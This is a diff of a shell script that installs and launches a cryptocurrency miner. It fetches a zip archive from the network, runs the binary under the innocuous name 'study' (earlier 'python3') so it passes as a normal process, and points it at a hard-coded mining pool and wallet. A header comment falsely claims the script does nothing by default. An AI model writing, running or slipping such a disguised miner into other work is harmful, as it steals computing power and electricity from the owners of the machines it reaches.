@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/study ]; then
+    if pgrep -x "study" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python3 -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -26,10 +26,9 @@ exit
 fi
 
 
-wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
-tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python3
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Study.zip
+unzip Study.zip
 rm config.json
-./python3 -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
